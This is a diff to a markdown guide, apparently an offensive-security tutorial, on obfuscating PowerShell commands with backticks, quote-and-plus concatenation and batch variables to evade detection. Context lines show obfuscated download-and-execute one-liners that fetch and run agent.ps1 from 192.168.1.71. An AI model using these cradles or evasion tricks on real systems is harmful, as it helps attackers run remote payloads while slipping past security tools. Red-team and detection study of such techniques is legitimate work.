@@ -115,13 +115,17 @@ The above string can be obfuscated using **powershell special caracters:** **`**
       $get = New-Object "N`et`Web`Cl`ie`nt"
       p`owe`r`she`l`l.exe `IE`X ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')
 
-<br />
-
 - Using **powershell special caracters: '** and **+**
 
       power'+'shell.exe IEX (New-Ob'+'ject Net.'+'WebCl'+'ient).Do'+'wnloadSt'+'ring('//19'+'2.16'+'8.1.71/agent.ps1')
 
 ![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)
+
+- Using an **batch** local variable inside powershell interpreter
+
+      cmd.exe /c "set var=Get-Date && cmd.exe /c echo %var%^" | powershell.exe 
+
+![powershell obfuscation](http://i.cubeupload.com/uDdG3G.jpg)
 
 ---
 
@@ -276,8 +280,11 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 
 
 ### Referencies
+https://twitter.com/404death<br />
+https://github.com/govolution/avepoc<br />
 https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/<br />
 
+<br />
 
 **Author: r00t-3xp10it**<br />
 **If you know more of this technics, fell free to report them ^_^**<br />
